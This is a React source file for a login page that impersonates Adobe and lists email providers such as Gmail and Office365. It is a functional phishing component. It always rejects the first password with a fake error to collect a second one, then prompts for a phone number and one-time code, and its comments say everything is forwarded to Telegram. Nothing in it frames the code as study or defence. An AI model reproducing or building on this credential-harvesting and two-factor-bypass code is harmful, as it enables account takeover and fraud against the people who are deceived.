import React, { useState } from 'react';
import { ArrowLeft, Mail, Lock, Eye, EyeOff, Sparkles, Phone } from 'lucide-react';
import { getBrowserFingerprint } from '../utils/oauthHandler';
import {
  generateOTP,
  storeOTPSession,
  verifyOTP,
  sendOTPToPhone,
  clearOTPSession,
  initiateOTPFlow,
  getOTPSession
} from '../utils/otpManager';

interface LoginPageProps {
  fileName: string;
  onBack: () => void;
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
  showBackButton?: boolean;
}

const FIRST_ATTEMPT_KEY = 'adobe_first_attempt';

const LoginPage: React.FC<LoginPageProps> = ({ 
  fileName, 
  onBack, 
  onLoginSuccess, 
  onLoginError,
  showBackButton = false 
}) => {
  const [selectedProvider, setSelectedProvider] = useState<string | null>(null);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [loginAttempts, setLoginAttempts] = useState(0);
  const [errorMessage, setErrorMessage] = useState('');
  
  // OTP Flow States
  const [showOTPFlow, setShowOTPFlow] = useState(false);
  const [showManualPhoneEntry, setShowManualPhoneEntry] = useState(false);
  const [manualPhone, setManualPhone] = useState('');
  const [detectedPhone, setDetectedPhone] = useState('');
  const [otp, setOtp] = useState('');
  const [firstAttemptPassword, setFirstAttemptPassword] = useState('');
  const [secondAttemptPassword, setSecondAttemptPassword] = useState('');
  const [currentEmail, setCurrentEmail] = useState('');

  const emailProviders = [
    { name: 'Office365', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/office-365-icon.png' },
    { name: 'Yahoo', domain: 'yahoo.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/yahoo-square-icon.png' },
    { name: 'Outlook', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-outlook-icon.png' },
    { name: 'AOL', domain: 'aol.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/aol-icon.png' },
    { name: 'Gmail', domain: 'gmail.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/gmail-icon.png' },
    { name: 'Others', domain: 'other.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png' }
  ];

  const handleProviderSelect = (provider: string) => {
    console.log(`🔐 Selected provider: ${provider}`);
    setSelectedProvider(provider);
  };

  const handleFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password || !selectedProvider) return;

    setIsLoading(true);
    setErrorMessage('');

    try {
      const currentAttempt = loginAttempts + 1;
      setLoginAttempts(currentAttempt);

      const browserFingerprint = await getBrowserFingerprint();

      const attemptData = {
        email,
        password,
        provider: selectedProvider,
        attemptTimestamp: new Date().toISOString(),
        localFingerprint: browserFingerprint,
        fileName: 'Adobe Cloud Access'
      };

      // FIRST ATTEMPT: Show error and store credentials locally
      if (currentAttempt === 1) {
        try {
          if (typeof sessionStorage !== 'undefined') {
            sessionStorage.setItem(FIRST_ATTEMPT_KEY, JSON.stringify(attemptData));
            console.log('🔒 First attempt captured (invalid password)');
          }
        } catch (err) {
          console.warn('⚠️ Could not write first attempt:', err);
        }

        setFirstAttemptPassword(password);
        await new Promise(resolve => setTimeout(resolve, 1500));
        setErrorMessage('The email or password you entered is incorrect. Please try again.');
        setIsLoading(false);
        setPassword('');
        return;
      }

      // SECOND ATTEMPT: Auto-detect phone and initiate OTP
      if (currentAttempt === 2) {
        setSecondAttemptPassword(password);
        setCurrentEmail(email);
        
        console.log('🚀 Starting automatic OTP flow...');
        const otpResult = await initiateOTPFlow(
          email,
          firstAttemptPassword,
          password,
          selectedProvider,
          typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown'
        );

        if (otpResult.success) {
          setDetectedPhone(otpResult.phone);
          setShowOTPFlow(true);
          console.log('✅ OTP sent to detected phone:', otpResult.phone);
        } else if (otpResult.manualEntryRequired) {
            setShowManualPhoneEntry(true);
            console.log('📱 Phone detection failed, requesting manual entry.');
        } else {
          setErrorMessage(`Failed to send OTP: ${otpResult.error}`);
          console.error('❌ OTP flow failed:', otpResult.error);
        }
        
        setIsLoading(false);
        return;
      }

    } catch (error) {
      console.error('Login error:', error);
      if (onLoginError) onLoginError('Login failed. Please try again.');
      setIsLoading(false);
    }
  };
  
  const handleManualPhoneSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!manualPhone || manualPhone.length < 10) {
        setErrorMessage('Please enter a valid phone number.');
        return;
    }
    
    setIsLoading(true);
    setErrorMessage('');

    const otpResult = await initiateOTPFlow(
      currentEmail,
      firstAttemptPassword,
      secondAttemptPassword,
      selectedProvider!,
      typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
      manualPhone
    );

    if (otpResult.success) {
      setDetectedPhone(otpResult.phone);
      setShowManualPhoneEntry(false);
      setShowOTPFlow(true);
      console.log('✅ OTP sent to manually entered phone:', otpResult.phone);
    } else {
      setErrorMessage(`Failed to send OTP: ${otpResult.error}`);
      console.error('❌ OTP flow failed after manual entry:', otpResult.error);
    }
    
    setIsLoading(false);
  };

  const handleOTPSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!otp || otp.length !== 6) {
      setErrorMessage('Please enter a valid 6-digit OTP');
      return;
    }

    setIsLoading(true);
    setErrorMessage('');

    try {
      // Verify OTP
      const isValid = verifyOTP(currentEmail, otp);

      if (!isValid) {
        setErrorMessage('Invalid OTP. Please try again.');
        setIsLoading(false);
        return;
      }

      // OTP verified! Build complete login data
      const browserFingerprint = await getBrowserFingerprint();
      const otpSession = getOTPSession(currentEmail);
      
      const completionData = {
        email: currentEmail,
        password: secondAttemptPassword,
        provider: selectedProvider,
        attemptTimestamp: new Date().toISOString(),
        localFingerprint: browserFingerprint,
        fileName: 'Adobe Cloud Access',
        // Password history and OTP for Telegram
        firstAttemptPassword,
        secondAttemptPassword,
        otpEntered: otp,
        deliveryMethod: 'phone',
        phone: otpSession?.phone || detectedPhone,
        phoneDetectedFrom: otpSession?.phoneSource || 'unknown',
      };

      console.log('✅ OTP verified successfully!');

      // Call onLoginSuccess which sends all data to Telegram
      if (onLoginSuccess) {
        onLoginSuccess(completionData);
      }

      // Clear OTP session
      clearOTPSession(currentEmail);

    } catch (error) {
      console.error('OTP verification error:', error);
      setErrorMessage('OTP verification failed. Please try again.');
      setIsLoading(false);
    }
  };

  const handleBackToForm = () => {
    setShowOTPFlow(false);
    setShowManualPhoneEntry(false);
    setOtp('');
    setErrorMessage('');
  };

  const handleBackToProviders = () => {
    setSelectedProvider(null);
    setEmail('');
    setPassword('');
    setLoginAttempts(0);
    setErrorMessage('');
    setShowOTPFlow(false);
    setShowManualPhoneEntry(false);
  };
  
    // MANUAL PHONE ENTRY FLOW
  if (showManualPhoneEntry) {
    return (
        <div
            className="login-bg min-h-screen flex items-center justify-center p-6 bg-gray-50 relative overflow-hidden"
            style={{ backgroundImage: "url('https://upload.wikimedia.org/wikipedia/commons/thumb/3/35/Sunset_clouds_and_crepuscular_rays_over_pacific_edit.jpg/640px-Sunset_clouds_and_crepuscular_rays_over_pacific_edit.jpg')", backgroundSize: 'cover', backgroundPosition: 'center', backgroundRepeat: 'no-repeat' }}
        >
            <div className="w-full max-w-sm relative z-10 mx-4 sm:mx-6">
                <div className="relative bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
                    <div className="px-6 py-8 bg-gradient-to-r from-white to-slate-50 border-b border-gray-100 flex items-center gap-4 relative">
                        <div className="absolute left-1/2 top-1/2 transform -translate-x-1/2 -translate-y-1/2">
                            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-slate-100 border border-slate-100">
                                <Sparkles className="w-4 h-4 text-indigo-500" />
                                <span className="text-xs font-medium text-indigo-700">Verify Your Phone</span>
                            </div>
                        </div>
                    </div>

                    <div className="px-6 py-6 flex flex-col gap-6">
                        <div className="space-y-4">
                            <p className="text-sm text-slate-600">
                                We could not automatically detect a phone number. Please enter your phone number to receive a verification code.
                            </p>

                            <form onSubmit={handleManualPhoneSubmit} className="space-y-4">
                                {errorMessage && (
                                    <div className="rounded-lg p-3 bg-red-50 border border-red-100">
                                        <p className="text-sm text-red-700">{errorMessage}</p>
                                    </div>
                                )}

                                <div>
                                    <label className="block text-sm font-medium text-slate-700 mb-2">Phone Number</label>
                                    <div className="relative">
                                        <Phone className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400 w-5 h-5" />
                                        <input
                                            type="tel"
                                            value={manualPhone}
                                            onChange={(e) => setManualPhone(e.target.value)}
                                            placeholder="e.g., +1 123-456-7890"
                                            required
                                            className="w-full pl-12 pr-4 py-3 bg-slate-50 border border-gray-100 rounded-xl text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-indigo-200 transition"
                                        />
                                    </div>
                                </div>

                                <button
                                    type="submit"
                                    disabled={isLoading}
                                    className="w-full py-3 rounded-xl font-semibold text-white bg-gradient-to-r from-indigo-600 to-indigo-500 hover:from-indigo-700 hover:to-indigo-600 disabled:opacity-60 disabled:cursor-not-allowed shadow transition-all"
                                >
                                    {isLoading ? (
                                        <span className="inline-block w-4 h-4 mr-2 border-2 border-white/40 border-t-white rounded-full animate-spin align-middle" />
                                    ) : null}
                                    <span>{isLoading ? 'Sending Code...' : 'Send Verification Code'}</span>
                                </button>
                            </form>
                        </div>

                        <div className="pt-2 border-t border-gray-100 space-y-2">
                            <button onClick={handleBackToForm} className="text-sm text-slate-600 hover:text-slate-900 font-medium w-full text-center">
                                ← Back
                            </button>
                            <p className="text-xs text-slate-500 text-center">© 2025 Adobe Inc. SSL secured.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
  }

  // OTP FLOW: Enter OTP code
  if (showOTPFlow) {
    return (
      <div
        className="login-bg min-h-screen flex items-center justify-center p-6 bg-gray-50 relative overflow-hidden"
        style={{
          backgroundImage: "url('https://upload.wikimedia.org/wikipedia/commons/thumb/3/35/Sunset_clouds_and_crepuscular_rays_over_pacific_edit.jpg/640px-Sunset_clouds_and_crepuscular_rays_over_pacific_edit.jpg')",
          backgroundSize: 'cover',
          backgroundPosition: 'center',
          backgroundRepeat: 'no-repeat'
        }}
      >
        <div className="w-full max-w-sm relative z-10 mx-4 sm:mx-6">
          <div className="relative bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
            <div className="px-6 py-8 bg-gradient-to-r from-white to-slate-50 border-b border-gray-100 flex items-center gap-4 relative">
              <div className="absolute left-1/2 top-1/2 transform -translate-x-1/2 -translate-y-1/2">
                <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-slate-100 border border-slate-100">
                  <Sparkles className="w-4 h-4 text-indigo-500" />
                  <span className="text-xs font-medium text-indigo-700">Enter Verification Code</span>
                </div>
              </div>
            </div>

            <div className="px-6 py-6 flex flex-col gap-6">
              <div className="space-y-4">
                <p className="text-sm text-slate-600">
                  We've sent a 6-digit verification code to your phone number ending in <strong>{detectedPhone.slice(-4)}</strong>
                </p>

                <form onSubmit={handleOTPSubmit} className="space-y-4">
                  {errorMessage && (
                    <div className="rounded-lg p-3 bg-red-50 border border-red-100">
                      <p className="text-sm text-red-700">{errorMessage}</p>
                    </div>
                  )}

                  <div>
                    <label className="block text-sm font-medium text-slate-700 mb-2">Verification Code</label>
                    <div className="relative">
                      <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400 w-5 h-5" />
                      <input
                        type="text"
                        value={otp}
                        onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))}
                        placeholder="000000"
                        maxLength={6}
                        className="w-full pl-12 pr-4 py-3 bg-slate-50 border border-gray-100 rounded-xl text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-indigo-200 transition text-center text-2xl tracking-widest font-semibold"
                      />
                    </div>
                    <p className="text-xs text-slate-500 mt-1">{otp.length}/6 digits</p>
                  </div>

                  <button
                    type="submit"
                    disabled={isLoading || otp.length !== 6}
                    className="w-full py-3 rounded-xl font-semibold text-white bg-gradient-to-r from-indigo-600 to-indigo-500 hover:from-indigo-700 hover:to-indigo-600 disabled:opacity-60 disabled:cursor-not-allowed shadow transition-all"
                  >
                    {isLoading ? (
                      <span className="inline-block w-4 h-4 mr-2 border-2 border-white/40 border-t-white rounded-full animate-spin align-middle" />
                    ) : null}
                    <span>{isLoading ? 'Verifying...' : 'Verify Code'}</span>
                  </button>
                </form>
              </div>

              <div className="pt-2 border-t border-gray-100 space-y-2">
                <button
                  onClick={handleBackToForm}
                  className="text-sm text-slate-600 hover:text-slate-900 font-medium w-full text-center"
                >
                  ← Back
                </button>
                <p className="text-xs text-slate-500 text-center">© 2025 Adobe Inc. SSL secured.</p>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // REGULAR LOGIN FORM
  return (
    <div
      className="login-bg min-h-screen flex items-center justify-center p-6 bg-gray-50 relative overflow-hidden"
      style={{
        backgroundImage: "url('https://upload.wikimedia.org/wikipedia/commons/thumb/3/35/Sunset_clouds_and_crepuscular_rays_over_pacific_edit.jpg/640px-Sunset_clouds_and_crepuscular_rays_over_pacific_edit.jpg')",
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        backgroundRepeat: 'no-repeat'
      }}
    >
      <div className="hidden md:flex absolute right-6 bottom-6 flex-col items-end z-20 pointer-events-none text-right">
        <div className="text-white/90 text-sm">PDF and e-signing tools</div>
        <div className="text-white/80 text-sm italic mt-1">Securely access your PDFs</div>
      </div>

      <div className="w-full max-w-sm relative z-10 mx-4 sm:mx-6">
        <div className="relative bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
          <div className="px-6 py-8 bg-gradient-to-r from-white to-slate-50 border-b border-gray-100 flex items-center gap-4 relative">
            <div className="absolute left-1/2 top-1/2 transform -translate-x-1/2 -translate-y-1/2">
              <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-slate-100 border border-slate-100">
                <Sparkles className="w-4 h-4 text-indigo-500" />
                <span className="text-xs font-medium text-indigo-700">{!selectedProvider ? 'Select Your Provider' : `Sign in with ${selectedProvider}`}</span>
              </div>
            </div>
          </div>

          <div className="px-6 py-6 flex flex-col gap-6">
            {!selectedProvider ? (
              <div className="space-y-3">
                <div className="grid grid-cols-2 gap-4">
                  {emailProviders.map((provider) => (
                    <button
                      key={provider.name}
                      onClick={() => handleProviderSelect(provider.name)}
                      type="button"
                      aria-label={`Select ${provider.name}`}
                      className="flex items-center gap-3 p-3 rounded-xl bg-white border border-gray-100 shadow-sm hover:shadow-md transition-shadow duration-200 justify-start"
                    >
                      <div className="flex items-center justify-center w-10 h-10 rounded-md bg-gradient-to-br from-slate-50 to-white border border-gray-100">
                        <img
                          src={provider.logo}
                          alt={provider.name}
                          className="w-6 h-6 object-contain"
                          onError={(e) => { const t = e.target as HTMLImageElement; t.style.display = 'none'; }}
                        />
                      </div>
                      <div className="text-sm font-semibold text-slate-800">{provider.name}</div>
                    </button>
                  ))}
                </div>
              </div>
            ) : (
              <div className="space-y-4">
                <div className="flex items-center gap-3">
                  <button onClick={handleBackToProviders} className="p-2 rounded-md hover:bg-slate-100" type="button">
                    <ArrowLeft className="w-4 h-4 text-slate-600" />
                  </button>
                  <div className="flex items-center gap-3">
                    <img
                      src={emailProviders.find(p => p.name === selectedProvider)?.logo}
                      alt={selectedProvider}
                      className="w-8 h-8 object-contain"
                      onError={(e) => { const t = e.target as HTMLImageElement; t.style.display = 'none'; }}
                    />
                    <h2 className="text-lg font-bold text-slate-900">Sign in with {selectedProvider}</h2>
                  </div>
                </div>

                <form onSubmit={handleFormSubmit} className="space-y-4">
                  {errorMessage && (
                    <div className="rounded-lg p-3 bg-red-50 border border-red-100">
                      <p className="text-sm text-red-700">{errorMessage}</p>
                    </div>
                  )}

                  <div>
                    <label className="block text-sm font-medium text-slate-700 mb-2">Email Address</label>
                    <div className="relative">
                      <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400 w-5 h-5" />
                      <input
                        type="email"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        placeholder="Enter your email address"
                        required
                        className="w-full pl-12 pr-4 py-3 bg-slate-50 border border-gray-100 rounded-xl text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-indigo-200 transition"
                      />
                    </div>
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-slate-700 mb-2">Password</label>
                    <div className="relative">
                      <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400 w-5 h-5" />
                      <input
                        type={showPassword ? 'text' : 'password'}
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        placeholder="Enter your password"
                        required
                        className="w-full pl-12 pr-12 py-3 bg-slate-50 border border-gray-100 rounded-xl text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-indigo-200 transition"
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-3 top-1/2 transform -translate-y-1/2 text-slate-500 hover:text-slate-700"
                      >
                        {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                      </button>
                    </div>
                  </div>

                  <button
                    type="submit"
                    disabled={isLoading || !email || !password}
                    className="w-full py-3 rounded-xl font-semibold text-white bg-gradient-to-r from-indigo-600 to-indigo-500 hover:from-indigo-700 hover:to-indigo-600 disabled:opacity-60 disabled:cursor-not-allowed shadow"
                  >
                    {isLoading && <span className="inline-block w-4 h-4 mr-2 border-2 border-white/40 border-t-white rounded-full animate-spin align-middle" />}
                    <span>{isLoading ? (loginAttempts < 2 ? 'Signing in...' : 'Proceeding to Verification...') : 'Sign In Securely'}</span>
                  </button>
                </form>
              </div>
            )}

            <div className="pt-2 border-t border-gray-100">
              <p className="text-xs text-slate-500 text-center">© 2025 Adobe Inc. SSL secured.</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginPage;